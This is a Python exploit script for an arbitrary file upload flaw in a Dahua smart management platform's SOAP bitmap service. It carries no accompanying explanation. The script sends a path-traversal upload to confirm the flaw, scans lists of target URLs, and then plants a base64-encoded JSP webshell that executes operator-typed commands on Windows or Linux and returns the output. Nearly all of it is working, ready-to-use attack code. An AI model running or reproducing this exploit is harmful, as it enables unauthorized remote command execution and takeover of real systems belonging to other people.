import requests
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
import base64
import json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/emap/webservice/gis/soap/bitmap")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
         "Content-Type": "text/xml; charset=utf-8"
    }
    random_str = generate_random_string(10)
    base_random_str = base64.b64encode(random_str.encode("utf-8")).decode("utf-8")
    ver_data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>           
	    <soapenv:Body>
     		    <res:uploadPicFile>
                    <arg0>
             	    <picPath>/../mqkwlsa.txt</picPath>
                    </arg0>
                    <arg1>{}</arg1>
                </res:uploadPicFile>
		</soapenv:Body>
</soapenv:Envelope>""".format(base_random_str)
    try:
        upresponse = requests.post(target, headers=headers, data=ver_data, verify=False)
        if upresponse.status_code == 200 and 'uploadPicFileResponse' in upresponse.text and 'soap' in upresponse.text:
            text_url = urljoin(url, "/upload/mqkwlsa.txt")
            text_response = requests.get(text_url,verify=False)
            if text_response.status_code == 200 and random_str in text_response.text:
                print(f"\033[31mDiscovered:{url}: DaHua_SmartManagementPlatform_ArbitraryFileUpload!\033[0m")
                return True
    except Exception as e:
        pass


def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/emap/webservice/gis/soap/bitmap")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "text/xml; charset=utf-8"
    }
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            shell = """<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%><%@ page import="java.io.*"%><%Process p=null;String  cmd = "klmnsdd";String os = System.getProperty("os.name").toLowerCase();if (os.contains("windows")) {p =  Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});}else{p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});}if(cmd != null){InputStream input = p.getInputStream();InputStreamReader ins = new InputStreamReader(input, "GBK");BufferedReader br = new BufferedReader(ins);out.print("<pre>");String line;while((line = br.readLine()) != null) {out.println(line);}out.print("</pre>");br.close();ins.close();input.close();p.getOutputStream().close();}new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"""
            shell = shell.replace("klmnsdd",command)
            shellbase64 = base64.b64encode(shell.encode("utf-8")).decode()
            ver_data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>           
	    <soapenv:Body>
     		    <res:uploadPicFile>
                    <arg0>
             	    <picPath>/../klmnsdto.jsp</picPath>
                    </arg0>
                    <arg1>{}</arg1>
                </res:uploadPicFile>
		</soapenv:Body>
</soapenv:Envelope>""".format(shellbase64)
            if "exit" not in command:
                try:
                    upresponse = requests.post(target, verify=False, headers=headers, data=ver_data, timeout=15,proxies=proxies)
                    if upresponse.status_code == 200 and 'uploadPicFileResponse' in upresponse.text and 'soap' in upresponse.text:
                        text_url = urljoin(url, "/upload/klmnsdto.jsp")
                        text_response = requests.get(text_url, verify=False,proxies=proxies)
                        if text_response.status_code == 200:
                            print(text_response.text)
                except Exception as e:
                    pass
            else:
                print("\033[93mThe tested webshell has been automatically deleted\033[0m")
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")